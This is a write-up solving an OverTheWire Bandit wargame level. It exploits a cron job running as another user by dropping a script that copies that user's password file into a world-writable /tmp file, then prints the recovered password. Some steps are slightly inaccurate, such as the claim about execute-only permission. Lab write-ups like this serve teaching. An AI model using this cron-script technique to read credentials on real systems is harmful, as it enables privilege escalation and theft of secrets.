# Level goal
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

# Solution

1. Same as before check what files relate to this challenge in the /etc/cron.d directory.
```Bash
ls /etc/cron.d
```

2. View the relevant file.
```Bash
cat /etc/cron.d/cronjob_bandit24
```

3. View the bash script that runs using that cron file.
```Bash
cat /usr/bin/cronjob_bandit24.sh
```

The script executes another script which is in the /var/spool directory. This at first seemed unimportant and could be managed by running the script by itself. But then i noticed that the owner of that script was bandit24 and anything that ran within that script would have the same privileges (the same for the cron file and the directory /var/spool/bandit24).

After acknowledging that the runs with bandit24 privilages, we can use this to get the password from the /etc/bandit_pass directory.

4. Create a directory in tmp to work in.
```Bash
mkdir /tmp/bandit24
```

5. Create the file to store the password in.
```Bash
touch bandit24pass
```

6. Since the file is going to be written in using other users we need to change its permission.
```Bash
chmod 666 bandit24pass
```
Note that the only important thing we care about is making other users able to write in this file, so effectively ```chmod 002 bandit24pass``` would essentially work.

7. Create the bash script to copy the password to the file created.
```Bash
nano test.sh
```

8. Write the bash script as below.
```Bash
#! /bin/bash
 cat /etc/bandit_pass/bandit24 > /tmp/bandit24/bandit24pass
 ```
 9. change the script to be exectuable by other users.
 ```Bash
 chmod 777 test.sh
 ```
 Note that we only need to be exectuable by other users, so ```chmod 001 test.sh``` would still work.
 
 The script would now run from the cron file and the password would be saved in the file.
 
 10. View the password after the script had run.
 ```Bash
 cat bandit24pass
 ```
 The password should be visible now.
 
 11. Exit bandit23 shell
 ```Bash
 exit
 ```
 
 12. ssh into bandit24
 ```Bash
 ssh bandit24@bandit.labs.overthewire.org -p 2220
 ```
 Password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 
 
